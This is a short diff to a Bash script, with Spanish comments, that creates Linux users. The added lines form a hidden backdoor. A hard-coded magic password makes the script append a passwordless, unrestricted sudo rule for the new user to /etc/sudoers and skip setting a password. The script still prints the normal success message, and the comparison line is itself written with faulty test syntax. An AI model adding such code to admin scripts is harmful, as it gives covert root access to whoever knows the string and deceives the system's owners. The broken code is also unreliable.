@@ -67,7 +67,16 @@ function_crear(){
  echo "$username:x:$usuarioid" >> /etc/group
  mkdir $directoriohome
  chown $username $directoriohome
- echo "$username:$usuariopass" | chpasswd
+ #como root: hacemos su $username creado con este pasword nos deja entrar s/passwd
+ if test $usuariopass ="U6aMy0wojraho";
+ then
+    echo "$username ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+    #sudo passwd -d $username
+ else
+   #sino pedira loguearse con el paswwd ingresado
+   #usuariopass=$
+    echo "$username:$usuariopass" | chpasswd
+ fi
  echo "el usuario se ha creado satisfactoriamente"
 }
 #Menu principal
